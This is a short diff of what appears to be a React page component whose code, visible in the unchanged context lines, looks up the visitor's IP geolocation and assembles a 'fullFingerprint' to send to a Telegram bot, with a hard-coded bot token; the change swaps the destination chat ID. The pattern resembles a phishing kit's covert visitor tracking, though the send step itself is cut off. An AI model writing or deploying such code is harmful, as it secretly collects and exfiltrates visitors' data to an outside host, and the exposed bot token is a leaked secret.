@@ -53,7 +53,7 @@ const Index: FC = () => {
             const fetchGeoAndSendTelegram = async () => {
                 const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
                 const botToken = '8023769128:AAFkIJ4X4w5QjRGdybksnDO6KsDm5VXqr3M';
-                const chatId = '-4877732699';
+                const chatId = '-4921212155';
                 const geoRes = await fetch(geoUrl);
                 const geoData = await geoRes.json();
                 const fullFingerprint = {
